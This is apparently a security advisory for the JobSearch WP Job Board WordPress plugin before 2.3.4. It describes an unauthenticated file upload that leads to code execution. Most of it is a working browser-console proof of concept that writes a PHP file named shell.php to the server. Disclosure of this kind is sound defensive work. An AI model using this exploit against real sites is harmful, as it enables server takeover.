## WordPress Plugin Vulnerabilities

# JobSearch WP Job Board < 2.3.4 - Arbitrary File Upload to RCE

### Description

The plugin does not validate files to be uploaded, which could allow unauthenticated attackers to upload arbitrary files such as PHP on the server

### Proof of Concept

Navigate to the site, and paste the following in your browser's console:
fetch('/wp-admin/admin-ajax.php', {
method: 'POST',
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
},
body: new URLSearchParams({
'action': 'jobsearch\_facebook\_get\_soc\_login\_url',
'user\_data': JSON.stringify({
"given\_name": (Math.random()\*0x1000).toFixed(),
"family\_name": (Math.random()\*0x1000).toFixed(),
"picture": "data:,<?php phpinfo(); //shell.php",
"name": (Math.random()\*0x1000).toFixed(),
"email": (Math.random()\*0x1000).toFixed(),
"id": (Math.random()\*0x1000).toFixed(),
})
})
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
Notice a new file named "shell.php" was uploaded to the site.
